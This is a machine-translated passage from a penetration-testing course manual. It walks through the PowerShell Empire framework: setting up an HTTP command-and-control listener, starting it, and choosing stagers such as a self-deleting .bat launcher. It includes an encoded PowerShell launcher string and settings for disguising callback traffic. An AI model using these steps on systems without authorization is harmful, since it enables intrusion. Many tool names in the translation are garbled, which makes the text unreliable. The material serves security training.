<div style="position:absolute;top:129430;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们选择了一个监听器，我们就可以运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">uselistener</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令，并选择</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，以</font></font></nobr></div>
<div style="position:absolute;top:129449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示信息和语法：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:129484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: listeners) &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">uselistener http</font></font></font></b></nobr></div>
<div style="position:absolute;top:129518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: listeners/http) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息</font></font></font></b></nobr></div>
</span></font>

<div style="position:absolute;top:129667;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="110"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 110 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:129700;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:130777;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:130777;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:130777;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">727</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:129796;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称：HTTP[S]</font></font></nobr></div>
<div style="position:absolute;top:129812;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类别：client_server</font></font></nobr></div>
<div style="position:absolute;top:129846;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作者：</font></font></nobr></div>
<div style="position:absolute;top:129864;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">@harmj0y</font></font></nobr></div>
<div style="position:absolute;top:129897;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述：</font></font></nobr></div>
<div style="position:absolute;top:129914;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动一个 http[s] 侦听器（PowerShell 或 Python），它使用</font></font></nobr></div>
<div style="position:absolute;top:129931;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GET/POST 方法。</font></font></nobr></div>
<div style="position:absolute;top:129965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP[S] 选项：</font></font></nobr></div>
<div style="position:absolute;top:129999;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:129999;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所需值    </font></font></nobr></div>
<div style="position:absolute;top:129999;left:619"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述</font></font></nobr></div>
<div style="position:absolute;top:130016;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:130016;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">—————————    </font></font></nobr></div>
<div style="position:absolute;top:130016;left:619"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----------</font></font></nobr></div>
<div style="position:absolute;top:130033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:130050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">杀死日期    </font></font></nobr></div>
<div style="position:absolute;top:130050;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误的    </font></font></nobr></div>
<div style="position:absolute;top:130050;left:619"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">侦听器的日期 t</font></font></nobr></div>
<div style="position:absolute;top:130067;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">o 退出 (MM/dd/yyyy)。</font></font></nobr></div>
<div style="position:absolute;top:130084;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:130084;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">真的    </font></font></nobr></div>
<div style="position:absolute;top:130084;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http    </font></font></nobr></div>
<div style="position:absolute;top:130084;left:619"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">侦听器的名称。</font></font></nobr></div>
<div style="position:absolute;top:130101;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动器    </font></font></nobr></div>
<div style="position:absolute;top:130101;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">真的    </font></font></nobr></div>
<div style="position:absolute;top:130101;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell -noP -sta -w 1 -enc 启动器字符串。</font></font></nobr></div>
<div style="position:absolute;top:130118;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认延迟真    </font></font></nobr></div>
<div style="position:absolute;top:130118;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5    </font></font></nobr></div>
<div style="position:absolute;top:130118;left:619"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理延迟/返回</font></font></nobr></div>
<div style="position:absolute;top:130135;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">间隔（以秒为单位）。</font></font></nobr></div>
<div style="position:absolute;top:130152;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DefaultLostLimit 真    </font></font></nobr></div>
<div style="position:absolute;top:130152;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">60    </font></font></nobr></div>
<div style="position:absolute;top:130152;left:619"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏检数</font></font></nobr></div>
<div style="position:absolute;top:130169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出前ns</font></font></nobr></div>
<div style="position:absolute;top:130186;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作时间错误    </font></font></nobr></div>
<div style="position:absolute;top:130186;left:619"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理的时间</font></font></nobr></div>
<div style="position:absolute;top:130203;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作（09:00-17:00）。</font></font></nobr></div>
<div style="position:absolute;top:130220;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:130237;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主持人    </font></font></b></nobr></div>
<div style="position:absolute;top:130237;left:255"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">真的    </font></font></b></nobr></div>
<div style="position:absolute;top:130237;left:352"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://10.11.0.4:80    </font></font></b></nobr></div>
<div style="position:absolute;top:130237;left:571"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于登台的主机名/IP。</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:130254;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">证书路径    </font></font></nobr></div>
<div style="position:absolute;top:130254;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误的    </font></font></nobr></div>
<div style="position:absolute;top:130254;left:619"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ht 的证书路径</font></font></nobr></div>
<div style="position:absolute;top:130271;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tps 听众。</font></font></nobr></div>
<div style="position:absolute;top:130288;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认抖动真    </font></font></nobr></div>
<div style="position:absolute;top:130288;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0    </font></font></nobr></div>
<div style="position:absolute;top:130288;left:619"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理reachba中的抖动</font></font></nobr></div>
<div style="position:absolute;top:130305;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ck 间隔（0.0-1.0）。</font></font></nobr></div>
<div style="position:absolute;top:130321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理人    </font></font></nobr></div>
<div style="position:absolute;top:130321;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误的默认值    </font></font></nobr></div>
<div style="position:absolute;top:130321;left:619"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于请求的代理</font></font></nobr></div>
<div style="position:absolute;top:130338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">t（默认、无或其他）。</font></font></nobr></div>
<div style="position:absolute;top:130356;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:130373;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绑定IP    </font></font></nobr></div>
<div style="position:absolute;top:130373;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">真的    </font></font></nobr></div>
<div style="position:absolute;top:130373;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0    </font></font></nobr></div>
<div style="position:absolute;top:130373;left:619"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要绑定的 IP</font></font></nobr></div>
<div style="position:absolute;top:130390;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">e 控制服务器。</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:130406;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口    </font></font></b></nobr></div>
<div style="position:absolute;top:130406;left:255"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">真的    </font></font></b></nobr></div>
<div style="position:absolute;top:130406;left:352"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">80    </font></font></b></nobr></div>
<div style="position:absolute;top:130406;left:619"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">侦听器的端口。</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:130423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器版本 真    </font></font></nobr></div>
<div style="position:absolute;top:130423;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软-IIS/7.5    </font></font></nobr></div>
<div style="position:absolute;top:130423;left:619"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">c 的服务器标头</font></font></nobr></div>
<div style="position:absolute;top:130440;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制服务器。</font></font></nobr></div>
<div style="position:absolute;top:130457;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:130477;left:360"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 824 - HTTP 侦听器选项</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:130506;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如上面的清单所示，有很多选项，但大多数已经设置或可选。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:130526;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最重要的参数是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Host</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Port</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，用于选择本地 IP 地址或</font></font></nobr></div>
<div style="position:absolute;top:130545;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分别为侦听器的主机名和端口号。</font><font style="vertical-align: inherit;">我们可以设置</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如下：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:130580;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: listeners) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 Host 10.11.0.4</font></font></font></b></nobr></div>
<div style="position:absolute;top:130597;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：听众）&gt;</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:130630;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还有其他值得注意的设置。</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DefaultDelay</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试模拟更合法的</font></font></nobr></div>
<div style="position:absolute;top:130649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过设置从受感染主机到侦听器的等待间隔回调时间来实现 HTTP 流量。</font></font></nobr></div>
<div style="position:absolute;top:130668;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DefaultJitter</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DefaultDelay</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置</font><font style="vertical-align: inherit;">为一个</font></font></nobr></div>
<div style="position:absolute;top:130688;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随机偏移。</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">KillDate</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将在指定的所有受感染主机上自行终止侦听器</font></font></nobr></div>
<div style="position:absolute;top:130707;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">日期。</font><font style="vertical-align: inherit;">这在渗透测试后执行清理时特别有用。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:130855;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="111"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 111 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:130888;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:131965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:131965;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:131965;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">728</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:130984;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦设置了选项，我们就可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">execute</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">启动侦听器</font><font style="vertical-align: inherit;">并返回到</font></font></nobr></div>
<div style="position:absolute;top:131003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">back 的</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主侦听器菜单</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">最后，我们可以列出所有可用的驿站与</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">usestager</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其次</font></font></nobr></div>
</span></font>
<font size="5" face="Times"><span style="font-size:36px;font-family:Times">
<div style="position:absolute;top:131023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">T</font></font><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和双</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A </font></font><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:131057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: listeners/http) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行</font></font></font></b></nobr></div>
<div style="position:absolute;top:131074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 启动侦听器 'http'</font></font></nobr></div>
<div style="position:absolute;top:131092;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 服务 Flask 应用程序“http”（延迟加载）</font></font></nobr></div>
<div style="position:absolute;top:131108;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 环境：生产</font></font></nobr></div>
<div style="position:absolute;top:131125;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">警告：不要在生产环境中使用开发服务器。</font></font></nobr></div>
<div style="position:absolute;top:131142;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">改用生产 WSGI 服务器。</font></font></nobr></div>
<div style="position:absolute;top:131159;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 调试模式：关闭</font></font></nobr></div>
<div style="position:absolute;top:131176;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 监听器成功启动！</font></font></nobr></div>
<div style="position:absolute;top:131210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: listeners/http) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回</font></font></font></b></nobr></div>
<div style="position:absolute;top:131244;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：听众）&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">usestager</font></font></font></b></nobr></div>
<div style="position:absolute;top:131261;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多/重击    </font></font></nobr></div>
<div style="position:absolute;top:131261;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统/启动器    </font></font></nobr></div>
<div style="position:absolute;top:131261;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">窗户/launcher_bat</font></font></nobr></div>
<div style="position:absolute;top:131278;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多/发射器    </font></font></nobr></div>
<div style="position:absolute;top:131278;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">osx/男子气概    </font></font></nobr></div>
<div style="position:absolute;top:131278;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">窗口/启动器_lnk</font></font></nobr></div>
<div style="position:absolute;top:131295;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多/宏    </font></font></nobr></div>
<div style="position:absolute;top:131295;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">osx/宏    </font></font></nobr></div>
<div style="position:absolute;top:131295;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">窗户/launcher_sct</font></font></nobr></div>
<div style="position:absolute;top:131312;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多/pyinstaller    </font></font></nobr></div>
<div style="position:absolute;top:131312;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统/包    </font></font></nobr></div>
<div style="position:absolute;top:131312;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">windows/launcher_vbs</font></font></nobr></div>
<div style="position:absolute;top:131329;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多人/战争    </font></font></nobr></div>
<div style="position:absolute;top:131329;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">osx/safari_launcher windows/launcher_xml</font></font></nobr></div>
<div style="position:absolute;top:131346;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统/苹果脚本    </font></font></nobr></div>
<div style="position:absolute;top:131346;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">osx/teensy    </font></font></nobr></div>
<div style="position:absolute;top:131346;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">窗口/宏</font></font></nobr></div>
<div style="position:absolute;top:131363;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统/应用程序    </font></font></nobr></div>
<div style="position:absolute;top:131363;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">窗户/兔子    </font></font></nobr></div>
<div style="position:absolute;top:131363;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">窗口/macroless_msword</font></font></nobr></div>
<div style="position:absolute;top:131380;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">osx/ducky    </font></font></nobr></div>
<div style="position:absolute;top:131380;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">窗口/dll    </font></font></nobr></div>
<div style="position:absolute;top:131380;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">窗户/青少年</font></font></nobr></div>
<div style="position:absolute;top:131397;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">osx/dylib    </font></font></nobr></div>
<div style="position:absolute;top:131397;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">窗户/鸭子    </font></font></nobr></div>
<div style="position:absolute;top:131414;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">osx/jar    </font></font></nobr></div>
<div style="position:absolute;top:131414;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">窗户/hta    </font></font></nobr></div>
<div style="position:absolute;top:131433;left:374"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 825 - 可用的 stager</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:131463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如清单 825 所示，Empire 支持适用于 Windows、Linux 和 OS X 的 stager。Windows stagers</font></font></nobr></div>
<div style="position:absolute;top:131482;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括对标准 DLL、HTLM 应用程序、Microsoft Office 宏和更多奇特的支持</font></font></nobr></div>
<div style="position:absolute;top:131501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与 USB Rubber Ducky 一起使用的</font><font style="vertical-align: inherit;">stager，例如</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">windows/</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ducky </font><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">723</font></font></font></nobr></div>
<div style="position:absolute;top:131534;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了了解它是如何工作的，让我们试试</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">windows/launcher_bat</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> stager。</font><font style="vertical-align: inherit;">选择后</font></font></nobr></div>
<div style="position:absolute;top:131553;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">stager，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">info</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">查看选项</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:131588;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: listeners) &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">usestager windows/launcher_bat</font></font></font></b></nobr></div>
<div style="position:absolute;top:131622;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：stager/windows/launcher_bat）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息</font></font></font></b></nobr></div>
<div style="position:absolute;top:131656;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称：BAT启动器</font></font></nobr></div>
<div style="position:absolute;top:131690;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述：</font></font></nobr></div>
<div style="position:absolute;top:131707;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成一个自删除的 .bat 启动器</font></font></nobr></div>
<div style="position:absolute;top:131724;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帝国。</font></font></nobr></div>
<div style="position:absolute;top:131758;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项：</font></font></nobr></div>
<div style="position:absolute;top:131792;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:131792;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所需值    </font></font></nobr></div>
<div style="position:absolute;top:131792;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述</font></font></nobr></div>
<div style="position:absolute;top:131809;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:131809;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">—————————    </font></font></nobr></div>
<div style="position:absolute;top:131809;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----------</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:131826;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听众    </font></font></b></nobr></div>
<div style="position:absolute;top:131826;left:263"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">真的    </font></font></b></nobr></div>
<div style="position:absolute;top:131826;left:506"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要为其生成 stager 的侦听器。</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:131843;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出文件    </font></font></nobr></div>
<div style="position:absolute;top:131843;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">False /tmp/launcher.bat 输出 .bat 启动器的文件，</font></font></nobr></div>
<div style="position:absolute;top:131860;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">否则显示在屏幕上。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
